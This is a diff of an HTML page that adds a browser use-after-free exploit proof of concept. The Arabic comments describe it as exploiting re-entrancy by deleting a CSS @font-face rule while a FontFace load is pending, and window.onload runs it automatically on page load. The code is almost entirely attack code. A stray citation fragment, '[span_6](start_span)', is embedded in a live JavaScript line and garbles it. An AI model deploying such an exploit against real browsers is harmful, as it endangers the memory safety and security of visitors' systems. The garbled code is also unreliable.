@@ -1,52 +1,41 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <style>
-        #debug-overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 200px;
-            background: rgba(0,0,0,0.9); color: #00ff00; font-family: monospace;
-            padding: 10px; overflow-y: scroll; z-index: 9999; font-size: 12px;
+    <style id="target-style">
+        /* قاعدة CSS ستتم إزالتها أثناء التحميل */
+        @font-face {
+            font-family: 'ExploitFont';
+            src: url('non-existent-font.woff2');
         }
     </style>
 </head>
 <body>
-    <div id="debug-overlay"></div>
-
     <script>
-        const overlay = document.getElementById('debug-overlay');
-        function log(msg) { overlay.innerHTML += msg + "<br>"; }
+        async function triggerUAF() {
+            // الوصول إلى مستند الخطوط
+            const fontFaceSet = document.fonts;
+            
+            // إنشاء كائن FontFace
+            const font = new FontFace("ExploitFont", "url(trigger.woff2)");
+            fontFaceSet.add(font);
 
-        (function() {
-            log("INIT: Starting Integrated Debugger...");
+            // بدء التحميل غير المتزامن
+            const loadPromise = font.load();
 
-            let font = new FontFace('Audit', new Uint8Array([0x46, 0x4f, 0x4e, 0x54]));
-            document.fonts.add(font);
-            log("STATE: Object added to Registry.");
+            // استغلال الثغرة عبر إعادة التفاعل (Re-entrancy)
+            // حذف القاعدة أثناء انتظار اكتمال الـ Promise
+            try {
+                const styleSheet = document.getElementById('target-style').sheet;
+                styleSheet.deleteRule(0); [span_6](start_span)// هذا الإجراء يحفز تحرير كائن CSSFontFace[span_6](end_span)
+                
+                await loadPromise;
+            } catch (e) {
+                console.error("تم تنفيذ إجراء الاستغلال، تحقق من حالة الذاكرة: ", e);
+            }
+        }
 
-            // مراقبة الوصول إلى الذاكرة
-            Object.defineProperty(font, 'loaded', {
-                get: () => {
-                    log("!!! UAF TRIGGERED !!!");
-                    log("ADDR: " + font); // طباعة العنوان في الذاكرة (إذا وجد)
-                    document.fonts.delete(font);
-                    font = null;
-                    log("ACTION: Object Deleted & Nullified");
-                    return Promise.resolve();
-                }
-            });
-
-            font.load().then(() => {
-                log("STATUS: Load Complete.");
-            }).catch(e => {
-                log("STATUS: Error Observed.");
-            });
-
-            // كشف تسرب الذاكرة (Memory Leak/UAF Tracking)
-            setInterval(() => {
-                log("HEAP_STATUS: Font count in document: " + document.fonts.size);
-            }, 1000);
-
-        })();
+        // تشغيل الثغرة تلقائياً عند تحميل الصفحة
+        window.onload = triggerUAF;
     </script>
 </body>
 </html>
